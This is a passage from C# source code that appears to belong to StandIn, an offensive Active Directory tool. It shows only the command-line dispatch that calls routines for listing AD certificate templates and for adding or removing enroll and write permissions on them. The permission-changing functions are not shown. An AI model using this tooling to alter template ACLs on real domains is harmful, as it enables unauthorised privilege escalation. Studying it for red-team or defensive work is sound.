                                    {
                                        ModifyADCSPermissions(ArgOptions.sFilter, ArgOptions.sNtaccount, true, false, false, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] Insufficient arguments provided (--filter)..");
                                    }
                                }
                                else if (ArgOptions.bEnroll)
                                {
                                    if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bAdd || ArgOptions.bRemove)
                                    {
                                        if (ArgOptions.bAdd)
                                        {
                                            ModifyADCSPermissions(ArgOptions.sFilter, ArgOptions.sNtaccount, false, true, false, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                        }
                                        else
                                        {
                                            ModifyADCSPermissions(ArgOptions.sFilter, ArgOptions.sNtaccount, false, true, false, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] Insufficient arguments provided (--filter/--add/--remove)..");
                                    }
                                }
                                else if (ArgOptions.bWrite)
                                {
                                    if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bAdd || ArgOptions.bRemove)
                                    {
                                        if (ArgOptions.bAdd)
                                        {
                                            ModifyADCSPermissions(ArgOptions.sFilter, ArgOptions.sNtaccount, false, false, true, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                        }
                                        else
                                        {
                                            ModifyADCSPermissions(ArgOptions.sFilter, ArgOptions.sNtaccount, false, false, true, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] Insufficient arguments provided (--filter/--add/--remove)..");
                                    }
                                }
                            } else
                            {
                                GetADCSTemplates(ArgOptions.sFilter, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("[!] Insufficient arguments provided..");
                    }
                }
            } else
            {
                hStandIn.getHelp();
            }
        }
    }
}
